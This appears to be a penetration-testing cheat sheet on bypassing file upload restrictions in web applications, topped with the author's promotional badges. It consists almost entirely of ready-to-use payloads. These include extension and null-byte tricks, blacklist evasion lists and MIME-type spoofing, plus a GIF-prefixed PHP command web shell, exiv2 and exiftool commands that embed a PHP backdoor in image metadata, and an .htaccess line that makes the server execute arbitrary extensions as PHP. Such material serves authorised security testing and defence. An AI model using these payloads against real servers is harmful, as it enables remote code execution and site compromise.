# File Upload Bypass

[![My Shop](https://img.shields.io/badge/My%20Shop-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech/extras)
[![Medium](https://img.shields.io/badge/Medium-%40verylazytech-%231572B6?style=flat&logo=medium&logoColor=white)](https://medium.com/@verylazytech)
[![Github](https://img.shields.io/badge/Github-verylazytech-%23181717?style=flat&logo=github&logoColor=white)](https://github.com/verylazytech)
[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech)
[![My GitBook](https://img.shields.io/badge/My%20GitBook-VeryLazyTech-%23FFDD00?style=flat&logo=gitbook&logoColor=white)](https://www.verylazytech.com)
[![X](https://img.shields.io/twitter/url?url=https%3A%2F%2Fx.com%2Fverylazytech)](https://x.com/verylazytech)

## Basic

```
# Content-Type —> Change the parameter in the request header using Burp, ZAP etc.
# Put server executable extensions like file.php5, file.shtml, file.asa, file.cert
# Changing letters to capital form file.aSp or file.PHp3
# Using trailing spaces and/or dots at the end of the filename like file.asp… … . . .. .. , file.asp , file.asp.
# Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
# Upload a file with 2 extensions—> file.php.jpg
# Use of null character—> file.asp%00.jpg
# Create a file with a forbidden extension —> file.asp:.jpg or file.asp::$data
# Combination of the above
```

## Bypassing Blacklists

Blacklisting is a type of protection where certain strings of data, in many cases, specific extensions, are explicitly prohibited from being sent to the web app server.
```
#php phtml  --> .php, .php3, .php4, .php5, .php6, .pht, .pHp, .Php, .phP
#asp	       --> .asp, .aspx
#perl	     --> .pl, .pm, .cgi, .lib
#jsp	       --> .jsp, .jspx, .jsw, .jsv, and .jspf
#Coldfusion --> .cfm, .cfml, .cfc, .dbm
```

## Bypassing File Upload Restrictions
```
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98 --> GIF89a; <?php system($_GET['cmd']); ?>) 
payload.php%00.jpg OR payload.php\x00.jpg
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php
```

## Injecting PHP into JPEG
```
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool "-comment<=back.php" back.png
```

## Uploading .htaccess to interpret .blah as .php
```
AddType application/x-httpd-php .blah
```

## MIME Type
Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type. Normal php MIME type:
```
Content-type: application/x-php
```
Replace with:
```
Content-type: image/jpeg
```


